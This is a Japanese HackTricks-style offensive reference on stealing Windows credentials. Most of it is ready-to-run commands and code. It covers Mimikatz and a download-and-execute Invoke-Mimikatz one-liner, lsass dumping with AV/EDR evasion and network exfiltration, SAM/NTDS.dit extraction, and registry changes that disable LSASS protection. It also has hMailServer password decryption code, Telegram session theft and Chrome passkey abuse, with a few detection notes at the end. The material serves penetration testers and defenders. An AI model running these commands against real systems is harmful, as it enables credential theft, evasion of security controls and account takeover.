# Windows認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**[このページ](credentials-mimikatz.md)で、Mimikatzで実行できるその他の操作を確認してください。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**こちらで認証情報の保護方法について確認できます。**](credentials-protections.md) **これらの保護機能により、Mimikatz による一部の認証情報の抽出を防止できる場合があります。**

## Meterpreter の認証情報

私が作成した [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用して、被害者内部の** **パスワードとハッシュを検索**します。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV の回避

### Procdump + Mimikatz

[**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) の **Procdump は正規の Microsoft tool** であるため、Defender では検出されません。\
この tool を使用して **lsass process を dump** し、**dump をダウンロード**して、dump から **credentials をローカルで抽出**できます。

[SharpDump](https://github.com/GhostPack/SharpDump) も使用できます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動的に実行されます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注**: 一部の **AV** は、**procdump.exe を使用して lsass.exe をダンプする**操作を**悪意のあるもの**として**検出**する場合があります。これは、**"procdump.exe" と "lsass.exe"** という文字列を**検出**しているためです。そのため、procdump に渡す**引数**として、lsass.exe の**名前**ではなく lsass.exe の **PID** を渡す方が**ステルス性が高くなります。**

### **comsvcs.dll** を使用した lsass のダンプ

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ発生時に**プロセスメモリをダンプする**役割を担います。この DLL には **`MiniDumpW`** という**関数**が含まれており、`rundll32.exe` を使用して呼び出すように設計されています。\
最初の 2 つの引数は使用しても意味がありませんが、3 番目の引数は 3 つの要素に分かれています。ダンプ対象のプロセス ID が 1 つ目の要素、ダンプファイルの場所が 2 つ目の要素、3 つ目の要素は必ず **full** という単語になります。代替オプションは存在しません。\
これら 3 つの要素が解析されると、DLL はダンプファイルの作成を開始し、指定されたプロセスのメモリをこのファイルに転送します。\
**comsvcs.dll** を使用して lsass プロセスをダンプできるため、procdump をアップロードして実行する必要がなくなります。この手法の詳細は [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) に記載されています。<sup>[[9]](#references)</sup>

実行には次のコマンドを使用します:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Task Managerを使用したlsassのダンプ**

1. Task Barを右クリックし、Task Managerをクリックします
2. More detailsをクリックします
3. Processesタブで「Local Security Authority Process」プロセスを検索します
4. 「Local Security Authority Process」プロセスを右クリックし、「Create dump file」をクリックします

### procdumpを使用したlsassのダンプ

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suiteの一部であるMicrosoft署名済みバイナリです。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade による lsass のダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は、メモリダンプを難読化し、ディスクに保存せずにリモートワークステーションへ転送できる Protected Process Dumper Tool です。

**主な機能**:

1. PPL 保護のバイパス
2. Defender のシグネチャベースの検出メカニズムを回避するためのメモリダンプファイルの難読化
3. ディスクに保存せずに RAW および SMB の upload methods を使用してメモリダンプをアップロード（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – MiniDumpWriteDumpを使用しないSSPベースのLSASSダンプ

Ink Dragonには、`MiniDumpWriteDump`を一度も呼び出さない3段階のdumperである **LalsDumper** が含まれているため、このAPIへのEDRフックは発火しない:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll`から32個の小文字の`d`で構成されたプレースホルダーを検索し、それを`rtu.txt`への絶対パスで上書きして、パッチ済みDLLを`nfdp.dll`として保存し、`AddSecurityPackageA("nfdp","fdp")`を呼び出す。これにより、**LSASS**は悪意のあるDLLを新しいSecurity Support Provider (SSP)としてロードする。
2. **LSASS内部のStage 2** – LSASSが`nfdp.dll`をロードすると、DLLは`rtu.txt`を読み込み、各バイトを`0x20`とXORし、デコードされたblobをメモリにマッピングしてから実行を移す。
3. **Stage 3 dumper** – マッピングされたpayloadは、ハッシュ化されたAPI名（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）から解決した**direct syscalls**を使用してMiniDumpのロジックを再実装する。`Tom`という専用exportは`%TEMP%\<pid>.ddt`を開き、圧縮されたLSASSダンプをファイルにストリーミングし、後でexfiltrationできるようハンドルを閉じる。

Operator向けメモ:

* `lals.exe`、`fdp.dll`、`nfdp.dll`、`rtu.txt`を同じディレクトリに置く。Stage 1はハードコードされたプレースホルダーを`rtu.txt`への絶対パスで書き換えるため、これらを分離するとchainが壊れる。
* 登録は`nfdp`を`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`に追加することで行われる。この値を自分で設定して、LSASSが毎回のboot時にSSPを再ロードするようにできる。
* `%TEMP%\*.ddt`ファイルは圧縮されたdumpである。ローカルでdecompressしてから、credential extractionのためにMimikatz/Volatilityへ渡す。
* `AddSecurityPackageA`を成功させるには、`lals.exe`の実行にadmin/SeTcb rightsが必要である。呼び出しが戻ると、LSASSはrogue SSPを透過的にロードしてStage 2を実行する。
* DLLをdiskから削除しても、LSASSからは追い出されない。registry entryを削除してLSASSをrestart（reboot）するか、長期的なpersistenceのために残しておく。

## CrackMapExec

### SAM hashのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲット DC から NTDS.dit をダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 対象 DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## SAM と SYSTEM の窃取

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM._ に**配置されている**はずです。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。

### Registry から

これらのファイルを盗む最も簡単な方法は、Registry からコピーを取得することです：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**ダウンロード**してKaliマシンに保存し、以下を使用して**ハッシュを抽出**します：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

この service を使用して、保護された files を copy できます。Administrator 権限が必要です。

#### Using vssadmin

vssadmin binary は Windows Server versions でのみ利用できます。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
ただし、**Powershell** から同じことができます。これは **SAM file のコピー方法** の例です（使用するハードドライブは "C:" で、C:\users\Public に保存されます）が、保護されたファイルのコピー全般に使えます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
書籍のコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使用して、SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

**NTDS.dit** ファイルは **Active Directory** の心臓部として知られており、ユーザーオブジェクト、グループ、およびそのメンバーシップに関する重要なデータを保持しています。ドメインユーザーの **password hashes** が保存されている場所です。このファイルは **Extensible Storage Engine (ESE)** データベースであり、**_%SystemRoom%/NTDS/ntds.dit_** に存在します。

このデータベースでは、主に次の3つのテーブルが管理されています。

- **Data Table**: ユーザーやグループなどのオブジェクトに関する詳細情報を保存します。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** を保持し、保存されたオブジェクトのセキュリティとアクセス制御を確保します。

Christoffer Andersson による database-layer の研究資料では、これらのテーブルとバージョンごとの動作について、さらに詳しく説明されています。<sup>[[8]](#references)</sup>

Windows はそのファイルとのやり取りに _Ntdsa.dll_ を使用し、_lsass.exe_ によって使用されます。そのため、**NTDS.dit** ファイルの **part** が **`lsass`** のメモリ内に存在する場合があります（**cache** を使用することによるパフォーマンス向上のため、最新のアクセスデータを取得できる可能性があります）。

#### NTDS.dit 内のハッシュを復号する

ハッシュは3回暗号化されています。

1. **BOOTKEY** と **RC4** を使用して Password Encryption Key (**PEK**) を復号する。
2. **PEK** と **RC4** を使用して **hash** を復号する。
3. **DES** を使用して **hash** を復号する。

**PEK** はすべてのドメインコントローラーで**同じ値**ですが、そのドメインコントローラー固有の **SYSTEM** hive にある **BOOTKEY** を使用して **NTDS.dit** 内で暗号化されています。したがって、credentials を抽出するには **NTDS.dit** と **SYSTEM**（`C:\Windows\System32\config\SYSTEM`）の両方が必要です。

### Ntdsutil を使用して NTDS.dit をコピーする

Windows Server 2008 以降で利用できます。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
[**volume shadow copy**](#stealing-sam-and-system) の手法を使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（再度、[**registry から dump するか、volume shadow copy**](#stealing-sam-and-system) の手法を使用してください）。

### **NTDS.dit から hash を抽出する**

**NTDS.dit** と **SYSTEM** ファイルを**取得した**ら、_secretsdump.py_ などのツールを使用して **hash を抽出**できます：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効な domain admin user を使用して、**自動的に抽出**することもできます:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
**大きな NTDS.dit ファイル**の場合は、[gosecretsdump](https://github.com/c-sto/gosecretsdump) を使用して抽出することを推奨します。

最後に、**metasploit module**: _post/windows/gather/credentials/domain_hashdump_ または **mimikatz** `lsadump::lsa /inject` も使用できます。

### **NTDS.dit から SQLite データベースへのドメインオブジェクトの抽出**

[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使用すると、NTDS オブジェクトを SQLite データベースに抽出できます。secret だけでなく、raw NTDS.dit ファイルがすでに取得されている場合に、さらなる情報抽出に使用できるオブジェクト全体とその属性も抽出されます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive は必須ではありませんが、secrets の復号（NT および LM hash、cleartext password などの supplemental credentials、Kerberos または trust key、NT および LM password history）を可能にします。その他の情報とともに、以下のデータが抽出されます: hash を含む user および machine account、UAC flag、最終ログオンおよびパスワード変更の timestamp、account の description、name、UPN、SPN、group と再帰的な membership、organizational unit の tree と membership、trust type、direction、attribute を含む trusted domain...

## Lazagne

[こちら](https://github.com/AlessandroZ/LaZagne/releases)から binary を download します。この binary を使用すると、複数の software から credential を抽出できます。
```
lazagne.exe all
```
## SAM と LSASS から credentials を抽出するその他の tools

### Windows credentials Editor (WCE)

この tool は memory から credentials を抽出するために使用できます。以下から download してください: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file から credentials を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルからcredentialを抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

ここからダウンロードできます：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)。そのまま**実行するだけで**パスワードが抽出されます。

## アイドル状態の RDP セッションの収集とセキュリティ制御の弱体化

Ink Dragon の FinalDraft RAT には、あらゆる red-teamer に役立つ手法を備えた `DumpRDPHistory` tasker が含まれています。<sup>[[3]](#references)</sup>

### DumpRDPHistory スタイルの telemetry 収集

* **Outbound RDP targets** – `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` にある各ユーザーハイブを解析します。各サブキーには、サーバー名、`UsernameHint`、および最終書き込みタイムスタンプが保存されています。PowerShell を使って FinalDraft のロジックを再現できます。

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログから Event ID **21**（ログオン成功）と **25**（切断）を照会し、誰がそのコンピューターを管理していたかを特定します。

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかを把握したら、その **切断された** セッションがまだ存在している間に、LSASS を（LalsDumper/Mimikatz で）dump します。CredSSP + NTLM fallback により、検証情報とトークンが LSASS に残るため、それらを SMB/WinRM 経由で replay し、`NTDS.dit` を取得したり、domain controller 上で persistence を確立したりできます。

### FinalDraft が標的とする Registry downgrades

同じ implant は、credential theft を容易にするため、複数の registry key も改変します。<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* `DisableRestrictedAdmin=1` を設定すると、RDP 中に完全な credential/ticket 再利用が強制され、pass-the-hash 型の pivot が可能になる。
* `LocalAccountTokenFilterPolicy=1` は UAC token filtering を無効化するため、local admin がネットワーク経由で unrestricted token を取得する。
* `DSRMAdminLogonBehavior=2` により、DC がオンラインの状態でも DSRM administrator がログオンできるようになり、攻撃者に別の組み込み high-privilege account が与えられる。
* `RunAsPPL=0` は LSASS PPL protections を解除するため、LalsDumper などの dumper による memory access が容易になる。

## hMailServer database credentials (post-compromise)

hMailServer は DB password を `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` の `[Database] Password=` の下に保存する。この値は static key `THIS_KEY_IS_NOT_SECRET` と 4-byte word endianness swaps を使用して Blowfish-encrypted されている。INI の hex string を次の Python snippet で使用する:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
clear-text passwordを使用して、ファイルロックを回避するためにSQL CEデータベースをコピーし、32-bit providerを読み込み、必要に応じてアップグレードしてからハッシュをクエリします:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列は hMailServer の hash format（hashcat mode `1421`）を使用します。これらの値を cracking すると、WinRM/SSH の pivot に再利用可能な credentials を取得できます。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部の tooling は、LSA logon callback `LsaApLogonUserEx2` を intercept することで、**plaintext logon passwords** を取得します。これは、authentication package callback を hook または wrap し、credentials を **logon 中**（hashing 前）に取得してから、disk に書き込むか operator に返すという手法です。通常は、LSA に inject または register する helper として実装され、成功した各 interactive/network logon event の username、domain、password を記録します。<sup>[[1]](#references)</sup>

Operational notes:
- authentication path に helper を load するには、local admin/SYSTEM が必要です。
- captured credentials は logon が発生した場合にのみ表示されます（hook に応じて、interactive、RDP、service、または network logon）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、saved connection information をユーザーごとの `sqlstudio.bin` ファイルに保存します。専用の dumpers はこのファイルを parse し、保存された SQL credentials を recover できます。command output のみを返す shell では、ファイルを Base64 として encode し、stdout に表示することで exfiltrate することがよくあります。<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
オペレーター側では、ファイルを再ビルドし、ローカルで dumper を実行して認証情報を復元します:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Telegram Desktop `tdata` session theft

Telegram Desktop は認証情報とアカウントの状態を **`tdata`** ディレクトリに保持します。コピーしたセッションは、互換性のあるツールで読み込むことで、認証が有効な間はアカウントのパスワードなしで認証に使用できます。ローカルデータの暗号化が有効な場合、stealer にはパスコードも必要です。認証済みセッションからは、identity data、dialog および membership metadata、メッセージ、ダウンロード可能なメディアなどが露出する可能性があります。<sup>[[10]](#references)</sup>

### Discovery and acquisition

インストール版と portable layout の両方を検索します。Microsoft Store の package name は異なるため、`TelegramMessenge` を含む package directory を列挙し、その `LocalCache\Roaming` subtree を調べます。<sup>[[10]](#references)</sup>
```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
Where-Object Name -Like '*TelegramMessenge*' |
ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```
通常の読み取りに失敗し、プロセスの token に `SeBackupPrivilege` が**すでに含まれ、有効化されている**場合、backup-aware access がフォールバックとして機能します。これは privilege を取得したり、プロセスを elevate したりするものではありません。必要な token privileges が存在する場合、`FILE_FLAG_BACKUP_SEMANTICS` を指定した `CreateFileW` は backup/restore semantics を要求し、ファイルの security checks をオーバーライドできますが、この flag だけでは互換性のない sharing lock を回避できません。<sup>[[10]](#references)[[11]](#references)</sup>

現在ロックされているファイルの場合は、**Volume Shadow Copy** を作成して読み取ります。ACL によってブロックされているファイルの場合、`robocopy /B` は backup mode を使用し、ファイルおよびディレクトリの ACL をオーバーライドします。<sup>[[10]](#references)[[12]](#references)</sup>
```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```
帯域幅を意識した implant は、まずファイルパスのインベントリだけを送信し、C2 によってすでに保存されているパスとスナップショット識別子を受け取り、不足しているファイルだけを upload する場合があります。そのため、再帰的な `tdata` 列挙後に行われる小規模な差分転送でも、セッション窃取が成功したことを示している可能性があります。<sup>[[10]](#references)</sup>

### Detection and containment

非Telegramプロセスによる `tdata` への再帰的アクセスを、`SeBackupPrivilege` の有効化、backup-semantics によるファイルオープン、VSS アクティビティ、または `/B` を使用する子 `robocopy.exe` と相関させます。また、`%APPDATA%` と `%LOCALAPPDATA%\Packages` の両方を短時間で列挙した後、同じプロセスから outbound connection が発生していないかも調査します。compromise 後は、**Settings → Devices**（または **Privacy & Security → Active Sessions**）を使用して認識できないセッションを終了します。two-step verification を有効にするだけでは、すでに盗まれた authorization は revoke されません。<sup>[[10]](#references)[[13]](#references)</sup>

## Windows 上の Chrome からの Passkeys / WebAuthn credential theft

**victim user** として Windows ホスト上で code execution を取得し、**Chrome + Google Password Manager synced passkeys** を使用している場合、passkeys は **admin/SYSTEM なし**でも興味深い post-exploitation target になります。<sup>[[4]](#references)</sup>

### 興味深いローカルアーティファクト
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** には、protobuf でエンコードされた **`WebauthnCredentialSpecifics`** レコードが保存されます。同一ユーザーのプロセスは、同期された passkeys の **RP ID**、**username**、**credential ID**、および暗号化された private-key のマテリアルを列挙できます。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** には、**`wrapped_identity_private_key`** や、同期された credentials の復元に使用されるラップ済みの秘密情報など、ローカルデバイスの enrollment state が保存されます。<sup>[[4]](#references)</sup>

迅速なトリアージ:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs can still be abused as a local signing oracle

ブラウザーが TPM-backed identity key を **`NCRYPT_OPAQUE_KEY_BLOB`** としてエクスポートし、その blob をユーザーがアクセス可能な状態に保存している場合、malware は raw private key を抽出する必要がありません。単に **同じマシン** 上で blob を再インポートし、攻撃者が制御するデータへの署名をローカル TPM に要求できます:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
これは、**hardware binding によりデバイス外へのエクスポートは防止できるが、侵害されたエンドポイント上での同一ユーザーによる利用は防止できない**ことを意味します。

### 実際の悪用経路

1. **Pass-the-key / device-identity relay**<sup>[[4]](#references)</sup>
- Chrome の LevelDB から `WebauthnCredentialSpecifics` を列挙する。
- passkey login を開始し、新しい WebAuthn challenge を取得する。
- 盗み出した `wrapped_identity_private_key` blob を被害者の TPM 上で使用し、cloud-authenticator request binding に署名する。
- 返された assertion を relying party に relay する。
- RP が `userVerification=preferred` を受け入れる場合や、**`UV=0`** の assertion を拒否しない場合に、特に有効である。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- `passkey_enclave_state` を削除するか、有効な署名付き `device/forget` operation を送信して、再オンボーディングを強制する。
- オンボーディング後もデバイスが **`uv_key_pending`** の状態にある場合、攻撃者が管理する UV public key を登録する。
- provider が新しい UV key について attestation / secure-hardware origin を検証しない場合、その攻撃者の key による後続の署名は **`UV=1`** として扱われる。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- recovery または rejoin を強制し、Chrome に synced-passkey master secret を取得させる。
- `passkey_enclave_state` の再作成または変更を監視し、平文の **security domain secret (SDS)** が常駐している間に Chrome の memory を dump する。
- 回収した SDS を使用して、すべての `WebauthnCredentialSpecifics` record 内の暗号化された field を復号し、portable WebAuthn private key を回収する。

### DFIR / detection ideas

- **`passkey_enclave_state` の削除/再作成**を監視する。<sup>[[4]](#references)</sup>
- browser 以外の process による Chrome **`Sync Data\LevelDB`** への異常なアクセスを alert する。
- **Chrome memory dump** や、疑わしい cross-process memory access を alert する。
- 繰り返される **Google Password Manager recovery PIN** prompt や、予期しない re-onboarding を調査する。
- WebAuthn の **`signCount`** は synced passkey では一定のままになる可能性があるため、役に立たないことが多い点に注意する。したがって、従来型の clone detection は弱い。

## References

- [1] [Unit 42 – 高価値セクターを標的とした、何年にもわたって検知されなかった Operation の調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA macro phishing → hMailServer credential decryption → Veeam CVE-2023-27532 による SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: relay network と stealthy offensive operation の内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: passwordless authentication における新たな attack surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows hacking: Microsoft のシステムと network への攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store の実際の仕組み: NTDS.dit の内部 (Part 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho が Still toolkit により cyber-espionage arsenal を拡大](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW function と `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – active session の終了](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
